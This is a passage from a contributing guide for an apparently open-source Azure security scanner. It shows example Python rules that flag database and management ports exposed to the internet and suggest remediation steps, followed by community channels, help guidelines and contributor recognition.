            resource.get("destination_port_range", "")
        )
        
        return any(port in self.database_ports for port in dest_port)
    
    def _parse_port_range(self, port_range: str) -> List[int]:
        """Parse Azure port range string into list of ports."""
        if port_range == "*":
            return list(range(1, 65536))  # All ports
        
        if "-" in port_range:
            start, end = map(int, port_range.split("-", 1))
            return list(range(start, end + 1))
        
        try:
            return [int(port_range)]
        except ValueError:
            return []
    
    def generate_remediation(self, finding) -> Dict[str, Any]:
        """Generate remediation steps for database exposure."""
        return {
            "description": "Restrict database access to trusted networks only",
            "steps": [
                "Identify legitimate sources that need database access",
                "Update NSG rule to allow access only from trusted IP ranges",
                "Consider using Azure Private Link for database connectivity",
                "Implement VPN or ExpressRoute for external access",
                "Enable Azure SQL firewall rules for additional protection"
            ],
            "automation_script": "scripts/restrict_database_access.ps1",
            "priority": "high",
            "estimated_time": "30 minutes"
        }


# Usage example
def register_custom_rules():
    """Register custom security rules with the scanner."""
    from security_copilot import SecurityScanner
    
    # Create scanner instance
    scanner = SecurityScanner(config, credential)
    
    # Register custom rules
    scanner.register_rule(DatabaseExposureRule())
    
    # You can also create rules inline
    scanner.register_rule(
        SecurityRule(
            name="management_port_exposure",
            severity=FindingSeverity.CRITICAL,
            description="Detects management ports exposed to internet",
            conditions=[
                RuleCondition.port_in([22, 3389, 5985, 5986]),  # SSH, RDP, WinRM
                RuleCondition.source_is_internet(),
                RuleCondition.access_is_allow()
            ]
        )
    )
    
    print("Custom security rules registered successfully!")


if __name__ == "__main__":
    register_custom_rules()
```

## Community

### Communication Channels

- **GitHub Discussions**: [General discussions, Q&A, feature requests](https://github.com/kineticKshitij/Security-copilot-agent/discussions)
- **GitHub Issues**: [Bug reports, specific feature requests](https://github.com/kineticKshitij/Security-copilot-agent/issues)
- **Discord Server**: [Real-time chat, community support](https://discord.gg/security-copilot)
- **Email**: [Direct contact for sensitive issues](mailto:community@security-copilot.com)

### Getting Help

**Before asking for help:**
1. Search existing issues and discussions
2. Check the documentation
3. Review the FAQ section
4. Try the troubleshooting guide

**When asking for help:**
1. Provide clear description of the problem
2. Include relevant error messages
3. Specify your environment (OS, Python version, etc.)
4. Share relevant configuration (without sensitive data)
5. Describe what you've already tried

### Mentorship Program

We offer mentorship for new contributors:
- **Beginner-Friendly Issues**: Look for `good first issue` and `help wanted` labels
- **Mentor Assignment**: Request a mentor for guidance on complex contributions
- **Office Hours**: Weekly virtual office hours for real-time help
- **Pair Programming**: Schedule pair programming sessions with maintainers

### Recognition

We recognize valuable contributions:
- **Contributor Recognition**: Listed in README and release notes
- **Swag Program**: T-shirts and stickers for regular contributors
- **Conference Opportunities**: Speaking opportunities at security conferences
- **Reference Letters**: Professional references for job applications

### Community Guidelines

**Be respectful and inclusive:**
- Use welcoming and inclusive language
- Respect different viewpoints and experiences
- Provide constructive feedback
- Help newcomers feel welcome

**Be collaborative:**
- Share knowledge and expertise
- Help others learn and grow
- Work together towards common goals
- Celebrate community achievements

**Be professional:**
- Keep discussions focused and relevant
- Avoid spam and self-promotion
- Respect privacy and confidentiality
- Follow project coding standards

---

## Thank You! 🙏

Thank you for contributing to Security Copilot Agent! Your contributions help make Azure environments more secure for everyone. We appreciate your time, effort, and expertise in making this project better.

For questions about this contributing guide, please reach out to us at [contributing@security-copilot.com](mailto:contributing@security-copilot.com).

---

**Last Updated**: August 5, 2025  
**Document Version**: 1.0  
**Maintainers**: Security Copilot Agent Core Team
